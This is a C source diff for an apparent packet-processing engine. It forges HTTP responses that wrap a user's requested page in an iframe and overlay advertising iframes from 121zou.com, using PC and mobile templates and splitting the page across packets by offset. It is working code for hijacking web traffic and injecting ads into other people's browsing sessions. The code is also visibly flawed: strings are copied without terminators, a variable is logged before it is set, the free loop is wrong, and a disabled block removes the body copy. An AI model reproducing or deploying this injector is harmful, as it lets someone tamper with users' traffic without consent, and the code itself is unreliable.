@@ -36,6 +36,30 @@
 #include "packet_http.h"
 #include "rte_memcpy.h"
 
+#define DEBUG
+#ifdef  DEBUG   
+#define debug(fmt,args...)  printf ("func(%s), line(%d)"fmt"\n" ,__FUNCTION__, __LINE__, ##args)
+#else   
+#define debug(fmt,args...)   
+#endif  /* DEBUG */ 
+
+typedef enum
+{
+    AD_TEMPLATE_PC,
+    AD_TEMPLATE_MOBILE,
+    AD_TEMPLATE_MAX,
+}ad_template_enum;
+
+typedef struct
+{
+    char *name;
+    char *head;
+    char *url;
+    char *tail;
+}http_body_t;
+
+http_body_t *http_body = NULL;
+
 #define HTTP_ONE_SPACE " "
 #define HTTP_FOUR_SPACE HTTP_ONE_SPACE HTTP_ONE_SPACE HTTP_ONE_SPACE HTTP_ONE_SPACE
 #define HTTP_CRLF                   "\r\n"
@@ -166,95 +190,162 @@ char *http_head_response6= "Mon, 14 Sep 2015 15:00:55 GMT";
 char *http_head_response7=
     HTTP_CRLF
     HTTP_CONNECTION HTTP_CRLF
-    HTTP_ACCEPT_RANGES HTTP_CRLF HTTP_CRLF;
-
-
-
-/*body template 1 */
-char * http_body1 =
-    "<!DOCTYPE HTML>\n"
-    "<html>\n"
-    "<head>\n"
-    "<meta charset=\"utf-8\">"
-    "<title></title>\n"
-    "<script>\n"
-    "d=document;\n"
-    "function u(){\n"
-    "var f = \"";
-
-char *http_body2 = "www.taobao.com";
-
-char *http_body3 =
-    "\";\n"
-    "d.getElementById(\"m\").src=f+(f.indexOf(\"&\")<0\?\'\?\':\'&\')+\'_t=t\';\n"
-    "}\n"
-    "\n"
-    "setTimeout(function(){d.getElementById(\"x\").style.display=\'block\';}, 2000);\n"
-    "\n"
-    "function c(){\n"
-    "x.style.display=\"none\"\n"
-    "}\n"
-    "\n"
-    "</script>\n"
-    "<style>\n"
-    "body {margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial}\n"
-    "a{cursor:pointer;display:block;position:absolute;border:1px;border-radius:1em;background-color:#555;color:#eee;z-index:3;right:5px;top:5px;line-height:20px;text-align:center;width:20px;font-size:10px}\n"
-    "#x{position:absolute;z-index:2;right:18px;bottom:0px;width:300px;height:250px}\n"
-    "#i{display:block; position:absolute; z-index:1; width:100%; height:100%}\n"
-    "</style>\n"
-    "</head>\n"
-    "<body onLoad=u()>\n"
-    "<div id=i>\n"
-    "<iframe id=m frameborder=0 width=100% height=100%></iframe>\n" 
-    "</div>\n"
-    "<div id=x>\n"
-    "<iframe src=\"";
-
-char *http_body4 = "http://www.121zou.com/ad.html";
-char *http_body5 =
-    "\" width=300 height=250 scrolling=no frameborder=0></iframe>\n"
-    "</div>\n"
-    "\n"
-    "</body>\n"
-    "</html>\n"
-    "\n";
+    HTTP_ACCEPT_RANGES HTTP_CRLF
+    HTTP_CRLF;
 
 
 
 
+// http response template 2
+// HTTP/1.1 200 OK
+// Date: Sat, 26 Sep 2015 08:34:03 GMT
+// Server: Apache/2.4.10 (Unix)
+// Last-Modified: Sat, 26 Sep 2015 08:32:19 GMT
+// ETag: "6ae-520a24d67eac0"
+// Accept-Ranges: bytes
+// Content-Length: 1710
+// Keep-Alive: timeout=5, max=100
+// Connection: Keep-Alive
+// Content-Type: text/html
+//
+// <!DOCTYPE HTML>
+// <html>
+//     <head>
+//         <meta name="viewport" content="width=device-width, minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"/>
+//         <title></title>
+//         <style>
+//             body {margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial}
+//             a{cursor:pointer;display:block;position:absolute;border:1px;border-radius:1em;background-color:#fff;color:#333; opacity:.8;z-index:3;right:2px;top:50%;margin-top:-10px;line-height:20px;text-align:center;width:20px;font-size:14px}
+//             #x{position:fixed;z-index:2;bottom:0px;width:100%;height:60px}
+//             #i{display:block; position:absolute; z-index:1; width:100%; height:100%}
+//         </style>
+//     </head>
+//     <body style='background-color:transparent; margin:0px; height:100%'>
+//         <div id=i>
+//             <iframe id='m' name='m' width='100%' height='100%' frameborder='0'  ></iframe>
+//         </div>
+//         <div id=x style='position:fixed;z-index:2;right:0px;bottom:-1px;width:100%;height:60px'>
+//             <a onClick='x.style.display="none"'>X</a>
+//             <iframe src="http://www.121zou.com/adm.html" width=100% height=60 scrolling=no frameborder=0 style='border:0px none;display:block'></iframe>
+//         </div>
+//         <script>
+//             (function () {
+//             var d = document;
+//             var f = "http://wap.hao123.com";
+//             var ua = navigator.userAgent.toLowerCase();
+//             var im = d.getElementById("m");
+//             im.src = f + (f.indexOf("&") < 0 ? '?' : '&') + '_t=t';
+//             if (ua.indexOf("iphone") > 0) {
+//             im.width=window.innerWidth;
+//             im.scrolling="no";
+//             };    
+//             })();
+//         </script>
+//
+//     </body>
+// </html>
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-#define USE_URI 0
+http_body_t default_http_body[AD_TEMPLATE_MAX] = 
+{
+    {
+        .name = "pc.html",
+        .head = 
+            "<!DOCTYPE HTML>\n"
+            "<html>\n"
+            "<head>\n"
+            "<meta charset=\"utf-8\">"
+            "<title></title>\n"
+            "<script>\n"
+            "d=document;\n"
+            "function u(){\n"
+            "var f = \"",
+        .url =
+            "www.taobao.com",
+        .tail =
+            "\";\n"
+            "d.getElementById(\"m\").src=f+(f.indexOf(\"&\")<0\?\'\?\':\'&\')+\'_t=t\';\n"
+            "}\n"
+            "\n"
+            "setTimeout(function(){d.getElementById(\"x\").style.display=\'block\';}, 2000);\n"
+            "\n"
+            "function c(){\n"
+            "x.style.display=\"none\"\n"
+            "}\n"
+            "\n"
+            "</script>\n"
+            "<style>\n"
+            "body {margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial}\n"
+            "a{cursor:pointer;display:block;position:absolute;border:1px;border-radius:1em;background-color:#555;color:#eee;z-index:3;right:5px;top:5px;line-height:20px;text-align:center;width:20px;font-size:10px}\n"
+            "#x{position:absolute;z-index:2;right:18px;bottom:0px;width:300px;height:250px}\n"
+            "#i{display:block; position:absolute; z-index:1; width:100%; height:100%}\n"
+            "</style>\n"
+            "</head>\n"
+            "<body onLoad=u()>\n"
+            "<div id=i>\n"
+            "<iframe id=m frameborder=0 width=100% height=100%></iframe>\n" 
+            "</div>\n"
+            "<div id=x>\n"
+            "<iframe src=\"http://www.121zou.com/speed.html\" width=300 height=250 scrolling=no frameborder=0></iframe>\n"
+            "</div>\n"
+            "\n"
+            "</body>\n"
+            "</html>\n"
+            "\n",
+    },
+    {
+        .name = "mobile.html",
+        .head = 
+            "<!DOCTYPE HTML>\n"
+            "<html>\n"
+            "    <head>\n"
+            "        <meta name=\"viewport\" content=\"width=device-width, minimum-scale=1.0,maximum-scale=1.0,user-scalable=no\"/>\n"
+            "        <title></title>\n"
+            "        <style>\n"
+            "            body {margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial}\n"
+            "            a{cursor:pointer;display:block;position:absolute;border:1px;border-radius:1em;background-color:#fff;color:#333; opacity:.8;z-index:3;right:2px;top:50%;margin-top:-10px;line-height:20px;text-align:center;width:20px;font-size:14px}\n"
+            "            #x{position:fixed;z-index:2;bottom:0px;width:100%;height:60px}\n"
+            "            #i{display:block; position:absolute; z-index:1; width:100%; height:100%}\n"
+            "        </style>\n"
+            "    </head>\n"
+            "    <body style=\'background-color:transparent; margin:0px; height:100%\'>\n"
+            "        <div id=i>\n"
+            "            <iframe id=\'m\' name=\'m\' width=\'100%\' height=\'100%\' frameborder=\'0\'  ></iframe>\n"
+            "        </div>\n"
+            "        <div id=x style=\'position:fixed;z-index:2;right:0px;bottom:-1px;width:100%;height:60px\'>\n"
+            "            <a onClick=\'x.style.display=\"none\"\'>X</a>\n"
+            "            <iframe src=\"http://www.121zou.com/adm.html\" width=100% height=60 scrolling=no frameborder=0 style=\'border:0px none;display:block\'></iframe>\n"
+            "        </div>\n"
+            "        <script>\n"
+            "            (function () {\n"
+            "            var d = document;\n"
+            "            var f = \"",
+        .url =
+            "http://wap.hao123.com",
+        .tail =
+            "\";\n"
+            "            var ua = navigator.userAgent.toLowerCase();\n"
+            "            var im = d.getElementById(\"m\");\n"
+            "            im.src = f + (f.indexOf(\"&\") < 0 ? \'?\' : \'&\') + \'_t=t\';\n"
+            "            if (ua.indexOf(\"iphone\") > 0) {\n"
+            "            im.width=window.innerWidth;\n"
+            "            im.scrolling=\"no\";\n"
+            "            };\n"
+            "            })();\n"
+            "        </script>\n"
+            "\n"
+            "    </body>\n"
+            "</html>\n",
+    },
+};
 
 uint16_t
 http_content_len_get(hytag_t *hytag)
 {
     uint16_t len = 0;
-    len += strlen(http_body1);    
-
-#if USE_URI
-    len += hytag->uri_len;
-#else
+    len += strlen(http_body[hytag->template].head);    
     len += hytag->url_len;
-#endif
-
-    len += strlen(http_body3);
-    len += strlen(http_body4);
-    len += strlen(http_body5);
-
+    len += strlen(http_body[hytag->template].tail);
     return len;
 }
 
@@ -280,6 +371,8 @@ berr ads_http_ok_head_fill(char *buf, hytag_t *hytag)
 
     /* get content length */
     content_len = http_content_len_get(hytag);
+    hytag->content_len = content_len;
+    debug("hytag->content_len(%d)", hytag->content_len);
     sprintf(content_buff, "%d", content_len);
     rte_memcpy(buf + len, content_buff, (size_t) strlen(content_buff));
     len += strlen(content_buff);
@@ -293,74 +386,261 @@ berr ads_http_ok_head_fill(char *buf, hytag_t *hytag)
 
     rte_memcpy(buf + len, http_head_response7, (size_t) strlen(http_head_response7));
     len += strlen(http_head_response7);
-#if !USE_D_PACKET
 
-    rte_memcpy(buf + len, http_body1, (size_t) strlen(http_body1));
-    len += strlen(http_body1);
+#if 0
 
-#if USE_URI
-    rte_memcpy(buf + len, hytag->uri, (size_t) hytag->uri_len);
-    len += hytag->uri_len;
-#else
+    rte_memcpy(buf + len, http_body[hytag->template].head, (size_t) strlen(http_body[hytag->template].head));
+    len += strlen(http_body[hytag->template].head);
+
     rte_memcpy(buf + len, hytag->url, (size_t) hytag->url_len);
     len += hytag->url_len;
+
+    rte_memcpy(buf + len, http_body[hytag->template].tail, (size_t) strlen(http_body[hytag->template].tail));
+    len += strlen(http_body[hytag->template].tail);
 #endif
 
-
-    rte_memcpy(buf + len, http_body3, (size_t) strlen(http_body3));
-    len += strlen(http_body3);
-
-    rte_memcpy(buf + len, http_body4, (size_t) strlen(http_body4));
-    len += strlen(http_body4);
-
-    rte_memcpy(buf + len, http_body5, (size_t) strlen(http_body5));
-    len += strlen(http_body5);
-
-#endif
     hytag->l5_len = len;
     return E_SUCCESS;
 }
-
 
 berr ads_http_content_fill(char *buf, hytag_t *hytag)
 {
     uint16_t len = 0;
     uint16_t content_len = 0;
     char *content_buff[10] = {0};
+    char *head = http_body[hytag->template].head;
+    char *url = hytag->url;
+    char *tail = http_body[hytag->template].tail;
+    uint16_t start;
+    uint16_t l;
 
     if ( NULL == buf || NULL == hytag )
     {
         return E_PARAM;
     }
 
-    rte_memcpy(buf + len, http_body1, (size_t) strlen(http_body1));
-    len += strlen(http_body1);
+    debug("hytag->content_offset(%d), hytag->fill_len(%d), hytag->content_len(%d)", hytag->content_offset,
+            hytag->fill_len, hytag->content_len);
+    if ( hytag->content_offset + hytag->fill_len > hytag->content_len)
+    {
+        return E_PARAM;
+    }
+    /* first seek the begin */
+    /* start at the head segment */
+    if ( hytag->content_offset < strlen(head))
+    {
+        debug("start(%d)", start);
+        start = hytag->content_offset;
+        /* seek the end */
+        /* end at the head segment*/
+        if ( hytag->content_offset + hytag->fill_len <= strlen(head))
+        {
+            l = hytag->fill_len;
+            rte_memcpy(buf + len, &head[start], (size_t) l);
+            len += l;
+            debug("len(%d)", len);
+        }
+        else /* end at the url segment */
+        if ( hytag->content_offset + hytag->fill_len <= strlen(head) + hytag->url_len)
+        {
+            /* first segment at the head segment */
+            l = strlen(head) - hytag->content_offset;
+            rte_memcpy(buf + len, &head[start], l);
+            len += l;
+            debug("len(%d)", len);
 
-    //rte_memcpy(buf + len, http_body2, (size_t) strlen(http_body2));
-    //len += strlen(http_body2);
-    
-    //rte_memcpy(buf + len, hytag->host, (size_t) hytag->host_len);
-    //len += hytag->host_len;
+            /* second segment at the url segment */
+            l = hytag->fill_len - len;
+            rte_memcpy(buf + len, url, l);
+            len += l;
+            debug("len(%d)", len);
+        }
+        /* end at the tail segment */
+        else
+        {
+            /* first segment at the head segment */
+            l = strlen(head) - hytag->content_offset;
+            rte_memcpy(buf + len, &head[start], l);
+            len += l;
+            debug("len(%d)", len);
 
-#if USE_URI
-    rte_memcpy(buf + len, hytag->uri, (size_t) hytag->uri_len);
-    len += hytag->uri_len;
-#else
-    rte_memcpy(buf + len, hytag->url, (size_t) hytag->url_len);
-    len += hytag->url_len;
-#endif
+            /* second segment at the url segment */
+            l = hytag->url_len;
+            rte_memcpy(buf + len, url, l);
+            len += l;
+            debug("len(%d)", len);
 
+            /* third segment at the tail segment */
+            l = hytag->fill_len - len;
+            rte_memcpy(buf + len, tail, l);
+            len += l;
+            debug("len(%d)", len);
+        }
+    }
+    else /* start at the url segment */
+    if ( hytag->content_offset < strlen(head) + hytag->url_len)
+    {
+        start = hytag->content_offset - strlen(head);
+        /* seek the end */
+        /* end at the url segment */
+        if ( hytag->content_offset + hytag->fill_len <= strlen(head) + hytag->url_len)
+        {
+            /* first segment at the url segment */
+            l = hytag->fill_len;
+            rte_memcpy(buf + len, &url[start], l);
+            len += l;
+            debug("len(%d)", len);
+        }
+        /* end at the tail segment */
+        else
+        {
+            /* first segment at the url segment */
+            l = hytag->url_len - start ;
+            rte_memcpy(buf + len, &url[start], l);
+            len += l;
+            debug("len(%d)", len);
 
-    rte_memcpy(buf + len, http_body3, (size_t) strlen(http_body3));
-    len += strlen(http_body3);
-
-    rte_memcpy(buf + len, http_body4, (size_t) strlen(http_body4));
-    len += strlen(http_body4);
-
-    rte_memcpy(buf + len, http_body5, (size_t) strlen(http_body5));
-    len += strlen(http_body5);
+            /* second segment at the tail segment */
+            l = hytag->fill_len - len;
+            rte_memcpy(buf + len, tail, l);
+            len += l;
+            debug("len(%d)", len);
+        }
+    }    /* start at the tial segment */
+    else
+    {
+        start = hytag->content_offset - strlen(head) - hytag->url_len;
+        /* start at the tial segment */
+        /* first segment at the tail segment */
+        l = hytag->fill_len;
+        rte_memcpy(buf + len, &tail[start], l);
+        len += l;
+        debug("len(%d)", len);
+    }
 
     hytag->l5_len = len;
+    debug("hytag->l5_len(%d), hytag->fill_len(%d)", hytag->l5_len, hytag->fill_len);
     return E_SUCCESS;
 }
 
+
+
+#define HTTP_BODY_ELEMENT_ALLOC(_http_body, _element, _size) \
+        if ( NULL != _http_body->_element ) \
+        { \
+            printf("%s %d http_body alloc failed \n", __func__, __LINE__); \
+            return E_NULL; \
+        } \
+        else \
+        { \
+            _http_body->_element = malloc(_size); \
+        }
+
+#define HTTP_BODY_ELEMENT_FREE(_http_body, _element, _num) \
+        if ( NULL != _http_body->_element ) \
+        { \
+            free((void *)_http_body->_element); \
+        } \
+        else \
+        { \
+            printf("%s %d http_body %d free failed\n", __func__, __LINE__, _num); \
+            return E_NULL; \
+        }
+
+berr ads_template_fill(http_body_t *http_to, http_body_t *http_from)
+{
+
+    if ( NULL == http_to || NULL == http_from )
+    {
+        return E_PARAM;
+    }
+
+    HTTP_BODY_ELEMENT_ALLOC(http_to, name, strlen(http_from->name));
+    rte_memcpy(http_to->name, http_from->name, (size_t)strlen(http_from->name));
+
+    HTTP_BODY_ELEMENT_ALLOC(http_to, head, strlen(http_from->head));
+    rte_memcpy(http_to->head, http_from->head, (size_t)strlen(http_from->head));
+
+    HTTP_BODY_ELEMENT_ALLOC(http_to, url, strlen(http_from->url));
+    rte_memcpy(http_to->url, http_from->url, (size_t)strlen(http_from->url));
+
+    HTTP_BODY_ELEMENT_ALLOC(http_to, tail, strlen(http_from->tail));
+    rte_memcpy(http_to->tail, http_from->tail, (size_t)strlen(http_from->tail));
+    return E_SUCCESS;
+}
+
+berr ads_template_default_load( http_body_t *http_body)
+{
+    int i;
+    int rv;
+    if ( NULL == http_body )
+    {
+        printf("%s %d http_body malloc failed\n", __func__, __LINE__);
+        return E_PARAM;
+    }
+
+    for ( i = 0; i < AD_TEMPLATE_MAX; i++ )
+    {
+        rv = ads_template_fill(&http_body[i], &default_http_body[i]);
+        if ( rv )
+        {
+            printf("%s %d rv=%d\n", __func__, __LINE__, rv);
+            return rv;
+        }
+    }
+
+    return E_SUCCESS;
+}
+
+berr ads_template_free( http_body_t *http_body)
+{
+    int i;
+    if ( NULL == http_body )
+    {
+        printf("%s %d http_body malloc failed\n", __func__, __LINE__);
+        return E_NULL;
+    }
+
+    for ( i = 0; i < AD_TEMPLATE_MAX; i++ )
+    {
+        HTTP_BODY_ELEMENT_FREE(http_body, name, i);
+        HTTP_BODY_ELEMENT_FREE(http_body, head, i);
+        HTTP_BODY_ELEMENT_FREE(http_body, url,  i);
+        HTTP_BODY_ELEMENT_FREE(http_body, tail, i);
+    }
+
+    printf("%s %d http_body free succeed!\n", __func__, __LINE__);
+    return E_SUCCESS;
+}
+
+berr ads_template_init(void)
+{
+    int rv;
+    int i;
+    http_body = malloc(sizeof(http_body_t)*AD_TEMPLATE_MAX);
+    if (NULL == http_body)
+    {
+        printf("%s %d http_body malloc failed\n", __func__, __LINE__);
+        return E_NULL;
+    }
+
+    memset(http_body, 0, sizeof(http_body_t)*AD_TEMPLATE_MAX);
+    rv = ads_template_default_load(http_body);
+    if (rv)
+    {
+        printf("%s %d rv=%d\n", __func__, __LINE__, rv);
+        return rv;
+    }
+
+    for( i = 0; i < AD_TEMPLATE_MAX; i++ )
+    {
+        printf("Template(%d):\n", i);
+        printf("name(%d):%s\n", strlen(http_body[i].name), http_body[i].name);
+        printf("head(%d):\n%s\n", strlen(http_body[i].head),http_body[i].head);
+        printf("url(%d):\n%s\n", strlen(http_body[i].url), http_body[i].url);
+        printf("tail(%d):\n%s\n", strlen(http_body[i].tail),http_body[i].tail);
+    }
+    printf("ads template init success!\n");
+
+    return E_SUCCESS;
+}
